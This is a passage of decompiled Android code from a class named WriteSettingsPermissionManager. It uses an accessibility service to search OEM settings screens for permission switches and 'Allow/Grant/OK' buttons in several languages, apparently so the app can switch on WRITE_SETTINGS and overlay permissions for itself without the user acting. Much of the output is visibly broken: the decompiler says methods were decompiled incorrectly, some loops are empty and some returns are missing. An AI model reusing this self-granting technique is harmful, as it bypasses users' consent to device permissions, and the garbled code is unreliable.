        AccessibilityNodeInfo accessibilityNodeInfo3;
        int size;
        int i;
        int size2;
        int i2;
        AccessibilityNodeInfo accessibilityNodeInfoM211732d0;
        Object obj;
        AccessibilityNodeInfo accessibilityNodeInfo4;
        boolean z;
        int iWidth;
        int iHeight;
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        boolean zEquals = lowerCase.equals("honor");
        ConcurrentHashMap.KeySetView keySetView = this.f53181b5;
        if (zEquals) {
            try {
                Iterator it = dh0.f55771c1.iterator();
                accessibilityNodeInfoM211701c4 = null;
                while (it.hasNext() && (accessibilityNodeInfoM211701c4 = m211701c4(accessibilityNodeInfo, (String) it.next(), 0)) == null) {
                }
            } catch (Exception e) {
                t60.m214705c6("WriteSettingsPerm", "❌ HONOR查找文本开关失败", e);
            }
            if (accessibilityNodeInfoM211701c4 == null) {
                t60.m214726f4("WriteSettingsPerm", "❌ 未找到HONOR目标文本节点");
            } else {
                accessibilityNodeInfoM211731c9 = m211731c9(accessibilityNodeInfoM211701c4);
                if (accessibilityNodeInfoM211731c9 != null) {
                    keySetView.add(accessibilityNodeInfoM211731c9);
                }
                if (accessibilityNodeInfoM211731c9 != null) {
                    if (m211735d6(accessibilityNodeInfoM211731c9)) {
                        accessibilityNodeInfoM211731c9 = null;
                    }
                    if (accessibilityNodeInfoM211731c9 != null) {
                        return accessibilityNodeInfoM211731c9;
                    }
                }
            }
            accessibilityNodeInfoM211731c9 = null;
            if (accessibilityNodeInfoM211731c9 != null) {
            }
        }
        if ((AbstractC0779a1.m213652a5(lowerCase, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase, "realme", false) || AbstractC0779a1.m213652a5(lowerCase, "oneplus", false)) && (accessibilityNodeInfoM211730c6 = m211730c6(accessibilityNodeInfo)) != null) {
            if (m211735d6(accessibilityNodeInfoM211730c6)) {
                accessibilityNodeInfoM211730c6 = null;
            }
            if (accessibilityNodeInfoM211730c6 != null) {
                return accessibilityNodeInfoM211730c6;
            }
        }
        AccessibilityNodeInfo accessibilityNodeInfoM211730c62 = m211730c6(accessibilityNodeInfo);
        if (accessibilityNodeInfoM211730c62 != null) {
            if (m211735d6(accessibilityNodeInfoM211730c62)) {
                accessibilityNodeInfoM211730c62 = null;
            }
            if (accessibilityNodeInfoM211730c62 != null) {
                return accessibilityNodeInfoM211730c62;
            }
        }
        ArrayList arrayList = new ArrayList();
        m211722b5(0, accessibilityNodeInfo, arrayList);
        int i3 = 300;
        if (arrayList.isEmpty()) {
            accessibilityNodeInfo3 = null;
            accessibilityNodeInfo2 = null;
        } else {
            Iterator it2 = arrayList.iterator();
            if (it2.hasNext()) {
                next = it2.next();
                if (it2.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo5 = (AccessibilityNodeInfo) next;
                    Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo5);
                    int i4 = rectM24a5.left > 300 ? -100 : 0;
                    int iWidth2 = rectM24a5.width();
                    int iHeight2 = rectM24a5.height();
                    accessibilityNodeInfo2 = null;
                    if (50 <= iWidth2 && iWidth2 < 201 && 30 <= iHeight2 && iHeight2 < 121) {
                        i4 -= 50;
                    }
                    if (accessibilityNodeInfo5.isVisibleToUser()) {
                        i4 -= 30;
                    }
                    if (accessibilityNodeInfo5.isClickable()) {
                        i4 -= 20;
                    }
                    while (true) {
                        Object next2 = it2.next();
                        AccessibilityNodeInfo accessibilityNodeInfo6 = (AccessibilityNodeInfo) next2;
                        Rect rectM24a52 = AbstractC0003a2.m24a5(accessibilityNodeInfo6);
                        int i5 = rectM24a52.left > i3 ? -100 : 0;
                        int iWidth3 = rectM24a52.width();
                        int iHeight3 = rectM24a52.height();
                        if (50 > iWidth3 || iWidth3 >= 201 || 30 > iHeight3) {
                            c = 'y';
                        } else {
                            c = 'y';
                            if (iHeight3 < 121) {
                                i5 -= 50;
                            }
                        }
                        if (accessibilityNodeInfo6.isVisibleToUser()) {
                            i5 -= 30;
                        }
                        if (accessibilityNodeInfo6.isClickable()) {
                            i5 -= 20;
                        }
                        if (i4 > i5) {
                            i4 = i5;
                            next = next2;
                        }
                        if (!it2.hasNext()) {
                            break;
                        }
                        i3 = 300;
                    }
                }
                accessibilityNodeInfo3 = (AccessibilityNodeInfo) next;
                ArrayList arrayList2 = new ArrayList();
                size = arrayList.size();
                i = 0;
                while (i < size) {
                    Object obj2 = arrayList.get(i);
                    i++;
                    if (!t60.m214686a2((AccessibilityNodeInfo) obj2, accessibilityNodeInfo3)) {
                        arrayList2.add(obj2);
                    }
                }
                size2 = arrayList2.size();
                i2 = 0;
                while (i2 < size2) {
                    Object obj3 = arrayList2.get(i2);
                    i2++;
                    m211711f4((AccessibilityNodeInfo) obj3);
                }
            } else {
                next = null;
            }
            accessibilityNodeInfo2 = null;
            accessibilityNodeInfo3 = (AccessibilityNodeInfo) next;
            ArrayList arrayList22 = new ArrayList();
            size = arrayList.size();
            i = 0;
            while (i < size) {
            }
            size2 = arrayList22.size();
            i2 = 0;
            while (i2 < size2) {
            }
        }
        if (accessibilityNodeInfo3 != null) {
            if (m211735d6(accessibilityNodeInfo3)) {
                accessibilityNodeInfo3 = accessibilityNodeInfo2;
            }
            if (accessibilityNodeInfo3 != null) {
                return accessibilityNodeInfo3;
            }
        }
        AccessibilityNodeInfo accessibilityNodeInfoM211726c0 = m211726c0(0, accessibilityNodeInfo, AbstractC0715je.m213298i5(dh0.f55751a1, AbstractC0716jf.m213306g5("开启", "启用", "允许", "打开", "确定", "同意", "授权", "开", "是", "好", "继续", "Continue", "Enable", "Allow", "Turn on", "OK", "Agree", "Grant", "ON", "Yes", "허용", "사용", "확인", "예", "有効にする", "許可", "オン", "はい")));
        if (accessibilityNodeInfoM211726c0 == null) {
            accessibilityNodeInfoM211726c0 = m211726c0(0, accessibilityNodeInfo, AbstractC0715je.m213298i5(dh0.f55771c1, dh0.f55757a7));
        }
        if (accessibilityNodeInfoM211726c0 != null) {
            if (m211735d6(accessibilityNodeInfoM211726c0)) {
                accessibilityNodeInfoM211726c0 = accessibilityNodeInfo2;
            }
            if (accessibilityNodeInfoM211726c0 != null) {
                return accessibilityNodeInfoM211726c0;
            }
        }
        ArrayList arrayList3 = new ArrayList();
        m211721b3(0, accessibilityNodeInfo, arrayList3);
        ArrayList arrayList4 = new ArrayList();
        int size3 = arrayList3.size();
        int i6 = 0;
        while (i6 < size3) {
            Object obj4 = arrayList3.get(i6);
            i6++;
            AccessibilityNodeInfo accessibilityNodeInfo7 = (AccessibilityNodeInfo) obj4;
            Rect rectM24a53 = AbstractC0003a2.m24a5(accessibilityNodeInfo7);
            if (rectM24a53.left > 300 && 30 <= (iWidth = rectM24a53.width()) && iWidth < 301 && 20 <= (iHeight = rectM24a53.height()) && iHeight < 151 && accessibilityNodeInfo7.isVisibleToUser()) {
                arrayList4.add(obj4);
            }
        }
        ArrayList arrayList5 = new ArrayList();
        int size4 = arrayList3.size();
        int i7 = 0;
        while (i7 < size4) {
            Object obj5 = arrayList3.get(i7);
            i7++;
            if (!arrayList4.contains((AccessibilityNodeInfo) obj5)) {
                arrayList5.add(obj5);
            }
        }
        int size5 = arrayList5.size();
        int i8 = 0;
        while (i8 < size5) {
            Object obj6 = arrayList5.get(i8);
            i8++;
            m211711f4((AccessibilityNodeInfo) obj6);
        }
        AccessibilityNodeInfo accessibilityNodeInfo8 = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(arrayList4);
        if (accessibilityNodeInfo8 != null) {
            Iterator it3 = AbstractC0715je.m213289h6(arrayList4).iterator();
            while (it3.hasNext()) {
                m211711f4((AccessibilityNodeInfo) it3.next());
            }
        } else {
            accessibilityNodeInfo8 = accessibilityNodeInfo2;
        }
        if (accessibilityNodeInfo8 != null) {
            if (m211735d6(accessibilityNodeInfo8)) {
                accessibilityNodeInfo8 = accessibilityNodeInfo2;
            }
            if (accessibilityNodeInfo8 != null) {
                return accessibilityNodeInfo8;
            }
        }
        AccessibilityNodeInfo accessibilityNodeInfoM211728c3 = m211728c3(accessibilityNodeInfo, AbstractC0716jf.m213306g5("switch", "toggle", "checkbox", "enable", "allow", "permission", "android:id/switch_widget", "android:id/checkbox", "android:id/toggle"), 0);
        if (accessibilityNodeInfoM211728c3 != null) {
            if (m211735d6(accessibilityNodeInfoM211728c3)) {
                accessibilityNodeInfoM211728c3 = accessibilityNodeInfo2;
            }
            if (accessibilityNodeInfoM211728c3 != null) {
                return accessibilityNodeInfoM211728c3;
            }
        }
        AccessibilityNodeInfo accessibilityNodeInfoM211729c5 = m211729c5(0, accessibilityNodeInfo, AbstractC0715je.m213298i5(dh0.f55771c1, dh0.f55757a7));
        if (accessibilityNodeInfoM211729c5 != null) {
            try {
                AccessibilityNodeInfo parent = accessibilityNodeInfoM211729c5.getParent();
                if (parent != null) {
                    keySetView.add(parent);
                    accessibilityNodeInfoM211732d0 = m211732d0(parent);
                    m211711f4(accessibilityNodeInfoM211729c5);
                }
            } catch (IllegalStateException e2) {
                tz0.m214810b0("⚠️ 获取权限节点父节点失败: ", e2.getMessage(), "WriteSettingsPerm");
            } catch (Exception e3) {
                t60.m214705c6("WriteSettingsPerm", "❌ 查找权限节点父节点失败", e3);
            }
            m211711f4(accessibilityNodeInfoM211729c5);
            accessibilityNodeInfoM211732d0 = accessibilityNodeInfo2;
        } else {
            accessibilityNodeInfoM211732d0 = accessibilityNodeInfo2;
        }
        if (accessibilityNodeInfoM211732d0 != null) {
            if (m211735d6(accessibilityNodeInfoM211732d0)) {
                accessibilityNodeInfoM211732d0 = accessibilityNodeInfo2;
            }
            if (accessibilityNodeInfoM211732d0 != null) {
                return accessibilityNodeInfoM211732d0;
            }
        }
        ArrayList arrayList6 = new ArrayList();
        m211723b6(0, accessibilityNodeInfo, arrayList6);
        if (arrayList6.isEmpty()) {
            accessibilityNodeInfo4 = accessibilityNodeInfo2;
        } else {
            int size6 = arrayList6.size();
            int i9 = 0;
            while (true) {
                if (i9 >= size6) {
                    obj = accessibilityNodeInfo2;
                    break;
                }
                obj = arrayList6.get(i9);
                i9++;
                try {
                    z = !((AccessibilityNodeInfo) obj).isChecked();
                } catch (Exception unused) {
                    z = false;
                }
                if (z) {
                    break;
                }
            }
            accessibilityNodeInfo4 = (AccessibilityNodeInfo) obj;
            if (accessibilityNodeInfo4 != null) {
                ArrayList arrayList7 = new ArrayList();
                int size7 = arrayList6.size();
                int i10 = 0;
                while (i10 < size7) {
                    Object obj7 = arrayList6.get(i10);
                    i10++;
                    if (!t60.m214686a2((AccessibilityNodeInfo) obj7, accessibilityNodeInfo4)) {
                        arrayList7.add(obj7);
                    }
                }
                int size8 = arrayList7.size();
                int i11 = 0;
                while (i11 < size8) {
                    Object obj8 = arrayList7.get(i11);
                    i11++;
                    m211711f4((AccessibilityNodeInfo) obj8);
                }
            } else {
                accessibilityNodeInfo4 = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(arrayList6);
                if (accessibilityNodeInfo4 != null) {
                    ArrayList arrayList8 = new ArrayList();
                    int size9 = arrayList6.size();
                    int i12 = 0;
                    while (i12 < size9) {
                        Object obj9 = arrayList6.get(i12);
                        i12++;
                        if (!t60.m214686a2((AccessibilityNodeInfo) obj9, accessibilityNodeInfo4)) {
                            arrayList8.add(obj9);
                        }
                    }
                    int size10 = arrayList8.size();
                    int i13 = 0;
                    while (i13 < size10) {
                        Object obj10 = arrayList8.get(i13);
                        i13++;
                        m211711f4((AccessibilityNodeInfo) obj10);
                    }
                } else {
                    int size11 = arrayList6.size();
                    int i14 = 0;
                    while (i14 < size11) {
                        Object obj11 = arrayList6.get(i14);
                        i14++;
                        m211711f4((AccessibilityNodeInfo) obj11);
                    }
                    accessibilityNodeInfo4 = accessibilityNodeInfo2;
                }
            }
        }
        if (accessibilityNodeInfo4 != null) {
            if (m211735d6(accessibilityNodeInfo4)) {
                accessibilityNodeInfo4 = accessibilityNodeInfo2;
            }
            if (accessibilityNodeInfo4 != null) {
                return accessibilityNodeInfo4;
            }
        }
        return accessibilityNodeInfo2;
    }

    /* renamed from: c3 */
    public final AccessibilityNodeInfo m211728c3(AccessibilityNodeInfo accessibilityNodeInfo, List list, int i) {
        String lowerCase;
        if (i > 15) {
            return null;
        }
        try {
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            if (viewIdResourceName != null) {
                lowerCase = viewIdResourceName.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            } else {
                lowerCase = "";
            }
            if (list == null || !list.isEmpty()) {
                Iterator it = list.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    if (AbstractC0779a1.m213652a5(lowerCase, (String) it.next(), false)) {
                        if (accessibilityNodeInfo.isVisibleToUser() && (accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isCheckable())) {
                            this.f53181b5.add(accessibilityNodeInfo);
                            return accessibilityNodeInfo;
                        }
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoM211728c3 = m211728c3(child, list, i + 1);
                    if (accessibilityNodeInfoM211728c3 != null) {
                        m211711f4(child);
                        return accessibilityNodeInfoM211728c3;
                    }
                    m211711f4(child);
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: c5 */
    public final AccessibilityNodeInfo m211729c5(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        String string3;
        String string4;
        if (i > 15) {
            return null;
        }
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                str = string3;
            }
            if (!arrayList.isEmpty()) {
                int size = arrayList.size();
                int i2 = 0;
                while (i2 < size) {
                    Object obj = arrayList.get(i2);
                    i2++;
                    String str2 = (String) obj;
                    if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                        this.f53181b5.add(accessibilityNodeInfo);
                        return accessibilityNodeInfo;
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i3 = 0; i3 < childCount; i3++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
                if (child != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoM211729c5 = m211729c5(i + 1, child, arrayList);
                    if (accessibilityNodeInfoM211729c5 != null) {
                        m211711f4(child);
                        return accessibilityNodeInfoM211729c5;
                    }
                    m211711f4(child);
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:25:0x0056, code lost:
    
        r4 = m211731c9(r3);
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x005a, code lost:
    
        if (r4 == null) goto L29;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x005c, code lost:
    
        r7.add(r4);
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x005f, code lost:
    
        return r4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:29:0x0060, code lost:
    
        r4 = new java.util.ArrayList();
        m211722b5(0, r12, r4);
        r12 = r4.size();
        r6 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x006d, code lost:
    
        if (r6 >= r12) goto L60;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x006f, code lost:
    
        r8 = r4.get(r6);
        r6 = r6 + 1;
        r8 = (android.view.accessibility.AccessibilityNodeInfo) r8;
        r9 = new android.graphics.Rect();
        r8.getBoundsInScreen(r9);
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x008e, code lost:
    
        if (java.lang.Math.abs(r9.centerY() - r2.centerY()) >= 100) goto L61;
     */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x0090, code lost:
    
        r7.add(r8);
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x0093, code lost:
    
        return r8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x0098, code lost:
    
        if (r3.isClickable() == false) goto L39;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x009a, code lost:
    
        r7.add(r3);
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x009d, code lost:
    
        return r3;
     */
    /* JADX WARN: Code restructure failed: missing block: B:39:0x009e, code lost:
    
        r12 = r3.getParent();
     */
    /* JADX WARN: Code restructure failed: missing block: B:40:0x00a2, code lost:
    
        if (r12 == null) goto L62;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00a5, code lost:
    
        if (r5 >= 3) goto L63;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00ab, code lost:
    
        if (r12.isClickable() == false) goto L47;
     */
    /* JADX WARN: Code restructure failed: missing block: B:45:0x00ad, code lost:
    
        r12.getBoundsInScreen(new android.graphics.Rect());
        r7.add(r12);
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x00b8, code lost:
    
        return r12;
     */
    /* JADX WARN: Code restructure failed: missing block: B:47:0x00b9, code lost:
    
        r12 = r12.getParent();
        r5 = r5 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x00c0, code lost:
    
        p000.t60.m214726f4("WriteSettingsPerm", "❌ OPPO/VIVO未找到开关或可点击控件");
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x00c5, code lost:
    
        return null;
     */
    /* renamed from: c6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m211730c6(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            Iterator it = dh0.f55771c1.iterator();
            AccessibilityNodeInfo accessibilityNodeInfoM211701c4 = null;
            do {
                int i = 0;
                if (!it.hasNext()) {
                    break;
                }
                accessibilityNodeInfoM211701c4 = m211701c4(accessibilityNodeInfo, (String) it.next(), 0);
            } while (accessibilityNodeInfoM211701c4 == null);
            if (accessibilityNodeInfoM211701c4 == null) {
                t60.m214726f4("WriteSettingsPerm", "❌ 未找到OPPO目标文本节点");
                return null;
            }
            Rect rect = new Rect();
            accessibilityNodeInfoM211701c4.getBoundsInScreen(rect);
            AccessibilityNodeInfo parent = accessibilityNodeInfoM211701c4.getParent();
            int i2 = 0;
            while (true) {
                ConcurrentHashMap.KeySetView keySetView = this.f53181b5;
                if (parent == null || i2 >= 5) {
                    break;
                }
                AccessibilityNodeInfo accessibilityNodeInfoM211704d1 = m211704d1(parent);
                if (accessibilityNodeInfoM211704d1 != null) {
                    accessibilityNodeInfoM211704d1.getBoundsInScreen(new Rect());
                    keySetView.add(accessibilityNodeInfoM211704d1);
                    return accessibilityNodeInfoM211704d1;
                }
                parent = parent.getParent();
                i2++;
            }
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ OPPO查找文本开关失败", e);
            return null;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:73:0x00de, code lost:
    
        continue;
     */
    /* renamed from: c9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m211731c9(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        try {
            if (!accessibilityNodeInfo.isVisibleToUser()) {
                t60.m214726f4("WriteSettingsPerm", "❌ 传入的文本节点无效或不可见");
                return null;
            }
            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
            if (parent != null) {
                int childCount = parent.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    AccessibilityNodeInfo child = parent.getChild(i);
                    if (child != null) {
                        CharSequence className = child.getClassName();
                        if (className == null || (string = className.toString()) == null) {
                            string = "";
                        }
                        t60.m214702c3("WriteSettingsPerm", "   检查子节点[" + i + "]: 类型=" + string + ", 可点击=" + child.isClickable() + ", 可见=" + child.isVisibleToUser());
                        if (!m211709e1(child)) {
                            List listM213306g5 = AbstractC0716jf.m213306g5("Switch", "Toggle", "CheckBox", "RadioButton", "CompoundButton", "ToggleButton", "SwitchCompat");
                            if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                                Iterator it = listM213306g5.iterator();
                                while (true) {
                                    if (!it.hasNext()) {
                                        break;
                                    }
                                    if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                                        t60.m214702c3("WriteSettingsPerm", "🔍 找到开关类型节点但不满足条件: 可点击=" + child.isClickable() + ", 启用=" + child.isEnabled() + ", 可见=" + child.isVisibleToUser());
                                        if (child.isVisibleToUser()) {
                                        }
                                    }
                                }
                            }
                        }
                        return child;
                    }
                }
            }
            AccessibilityNodeInfo parent2 = parent != null ? parent.getParent() : null;
            for (int i2 = 1; parent2 != null && i2 <= 15; i2++) {
                int childCount2 = parent2.getChildCount();
                for (int i3 = 0; i3 < childCount2; i3++) {
                    AccessibilityNodeInfo child2 = parent2.getChild(i3);
                    if (child2 != null) {
                        if (m211709e1(child2)) {
                            return child2;
                        }
                        AccessibilityNodeInfo accessibilityNodeInfoM211732d0 = m211732d0(child2);
                        if (accessibilityNodeInfoM211732d0 != null) {
                            return accessibilityNodeInfoM211732d0;
                        }
                    }
                    try {
                    } catch (Exception e) {
                        e = e;
                        t60.m214705c6("WriteSettingsPerm", "❌ 查找右侧开关控件时发生异常", e);
                        return null;
                    }
                }
                parent2 = parent2.getParent();
            }
            return null;
        } catch (Exception e2) {
            e = e2;
        }
    }

    /* renamed from: d0 */
    public final AccessibilityNodeInfo m211732d0(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        List listM213306g5 = AbstractC0716jf.m213306g5("Switch", "Toggle", "CheckBox", "RadioButton", "CompoundButton", "ToggleButton", "SwitchCompat");
        if (listM213306g5 == null || !listM213306g5.isEmpty()) {
            Iterator it = listM213306g5.iterator();
            while (true) {
                if (!it.hasNext()) {
                    break;
                }
                if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                    if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled()) {
                        return accessibilityNodeInfo;
                    }
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                this.f53181b5.add(child);
                AccessibilityNodeInfo accessibilityNodeInfoM211732d0 = m211732d0(child);
                if (accessibilityNodeInfoM211732d0 != null) {
                    return accessibilityNodeInfoM211732d0;
                }
            }
        }
        return null;
    }

    /* renamed from: d4 */
    public final void m211733d4(AccessibilityEvent accessibilityEvent) {
        String string;
        if (this.f53169a3 && this.f53170a4) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - this.f53173a7 < 2000) {
                return;
            }
            this.f53173a7 = jCurrentTimeMillis;
            try {
                int eventType = accessibilityEvent.getEventType();
                if (eventType == 32 || eventType == 2048) {
                    CharSequence packageName = accessibilityEvent.getPackageName();
                    if (packageName == null || (string = packageName.toString()) == null) {
                        string = "";
                    }
                    if (m211708e0(string)) {
                        u11 u11Var = this.f53180b4;
                        if (u11Var != null) {
                            u11Var.m215253a7(null);
                        }
                        this.f53180b4 = AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$handleAccessibilityEvent$1(this, null), 3);
                        return;
                    }
                    if (string.equals(this.f53167a1.getPackageName())) {
                        if (m211734d5()) {
                            m211741e6();
                        }
                    } else {
                        u11 u11Var2 = this.f53180b4;
                        if (u11Var2 != null) {
                            u11Var2.m215253a7(null);
                        }
                        this.f53180b4 = AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$handleAccessibilityEvent$2(this, null), 3);
                    }
                }
            } catch (Exception e) {
                t60.m214705c6("WriteSettingsPerm", "❌ 处理无障碍事件失败", e);
            }
        }
    }

    /* renamed from: d5 */
    public final boolean m211734d5() {
        try {
            return Settings.System.canWrite(this.f53167a1);
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 检查WRITE_SETTINGS权限失败", e);
            return false;
        }
    }

    /* renamed from: d6 */
    public final boolean m211735d6(AccessibilityNodeInfo accessibilityNodeInfo) {
        return this.f53182b6.contains(m211705d2(accessibilityNodeInfo));
    }

    /* JADX WARN: Removed duplicated region for block: B:42:0x00cc A[Catch: Exception -> 0x0050, TryCatch #0 {Exception -> 0x0050, blocks: (B:3:0x0007, B:6:0x0010, B:8:0x0039, B:11:0x0049, B:17:0x0054, B:19:0x005a, B:23:0x0062, B:31:0x00aa, B:33:0x00b0, B:35:0x00b6, B:37:0x00bc, B:39:0x00c2, B:42:0x00cc, B:44:0x00d2, B:46:0x00d8, B:49:0x00e2, B:51:0x00e8, B:53:0x00ee, B:56:0x00f8, B:58:0x00fe, B:60:0x0104, B:26:0x0086, B:28:0x008d, B:63:0x0110, B:65:0x0118, B:70:0x012b), top: B:74:0x0007 }] */
    /* JADX WARN: Removed duplicated region for block: B:49:0x00e2 A[Catch: Exception -> 0x0050, TryCatch #0 {Exception -> 0x0050, blocks: (B:3:0x0007, B:6:0x0010, B:8:0x0039, B:11:0x0049, B:17:0x0054, B:19:0x005a, B:23:0x0062, B:31:0x00aa, B:33:0x00b0, B:35:0x00b6, B:37:0x00bc, B:39:0x00c2, B:42:0x00cc, B:44:0x00d2, B:46:0x00d8, B:49:0x00e2, B:51:0x00e8, B:53:0x00ee, B:56:0x00f8, B:58:0x00fe, B:60:0x0104, B:26:0x0086, B:28:0x008d, B:63:0x0110, B:65:0x0118, B:70:0x012b), top: B:74:0x0007 }] */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00f8 A[Catch: Exception -> 0x0050, TryCatch #0 {Exception -> 0x0050, blocks: (B:3:0x0007, B:6:0x0010, B:8:0x0039, B:11:0x0049, B:17:0x0054, B:19:0x005a, B:23:0x0062, B:31:0x00aa, B:33:0x00b0, B:35:0x00b6, B:37:0x00bc, B:39:0x00c2, B:42:0x00cc, B:44:0x00d2, B:46:0x00d8, B:49:0x00e2, B:51:0x00e8, B:53:0x00ee, B:56:0x00f8, B:58:0x00fe, B:60:0x0104, B:26:0x0086, B:28:0x008d, B:63:0x0110, B:65:0x0118, B:70:0x012b), top: B:74:0x0007 }] */
    /* renamed from: d7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211736d7() {
        String string;
        String string2;
        boolean z;
        String string3;
        String string4;
        String string5;
        String string6;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53166a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return false;
            }
            ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55771c1, AbstractC0716jf.m213306g5(this.f53167a1.getPackageName(), "overlay"));
            C0313x1ec3a128 c0313x1ec3a128 = new h10() { // from class: com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$isCorrectWriteSettingsPage$allNodes$1
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    t60.m214695b6((AccessibilityNodeInfo) obj, "it");
                    return Boolean.TRUE;
                }
            };
            ArrayList arrayList = new ArrayList();
            m211698b4(rootInActiveWindow, c0313x1ec3a128, arrayList);
            int size = arrayList.size();
            boolean z2 = false;
            boolean z3 = false;
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
                CharSequence text = accessibilityNodeInfo.getText();
                String str = "";
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string6 = contentDescription.toString()) != null) {
                    str = string6;
                }
                String lowerCase = (string + " " + str).toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (!arrayListM213298i5.isEmpty()) {
                    int size2 = arrayListM213298i5.size();
                    int i2 = 0;
                    while (true) {
                        if (i2 >= size2) {
                            break;
                        }
                        Object obj2 = arrayListM213298i5.get(i2);
                        i2++;
                        String str2 = (String) obj2;
                        t60.m214694b5(str2, "keyword");
                        String lowerCase2 = str2.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        if (AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                            z2 = true;
                            break;
                        }
                    }
                }
                if (accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isCheckable()) {
                    CharSequence className = accessibilityNodeInfo.getClassName();
                    if (className == null || (string5 = className.toString()) == null) {
                        CharSequence className2 = accessibilityNodeInfo.getClassName();
                        if (className2 == null || (string4 = className2.toString()) == null) {
                            CharSequence className3 = accessibilityNodeInfo.getClassName();
                            if (className3 == null || (string3 = className3.toString()) == null) {
                                CharSequence className4 = accessibilityNodeInfo.getClassName();
                                if (className4 != null && (string2 = className4.toString()) != null) {
                                    z = true;
                                    if (AbstractC0779a1.m213652a5(string2, "LinearLayout", true)) {
                                        z3 = z;
                                    }
                                }
                            } else {
                                z = true;
                                if (AbstractC0779a1.m213652a5(string3, "Button", true)) {
                                }
                                z3 = z;
                            }
                        } else {
                            z = true;
